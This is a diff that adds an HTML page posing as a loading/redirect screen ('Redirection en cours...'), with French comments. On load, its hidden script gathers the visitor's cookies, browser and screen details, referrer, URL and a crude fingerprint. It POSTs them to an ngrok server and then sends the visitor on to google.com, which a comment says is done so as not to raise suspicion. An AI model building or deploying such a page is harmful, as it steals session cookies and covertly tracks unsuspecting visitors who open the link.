@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Chargement...</title>
+</head>
+<body>
+    <h1>Redirection en cours...</h1>
+
+    <script>
+        async function sendData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+                cookies: document.cookie,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referer: document.referrer,
+                url: window.location.href,
+                fingerprint: await getFingerprint()
+            };
+
+            // Envoi vers ton serveur
+            fetch('http://relax-scenic-replace.ngrok-free.dev:80/log', {  // ← Remplace par ton URL ngrok
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+
+            // Redirection (optionnel, pour pas éveiller les soupçons)
+            window.location = "https://google.com";
+        }
+
+        async function getFingerprint() {
+            // Fingerprint simple mais efficace
+            return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
+        }
+
+        sendData();
+    </script>
+</body>
+</html>
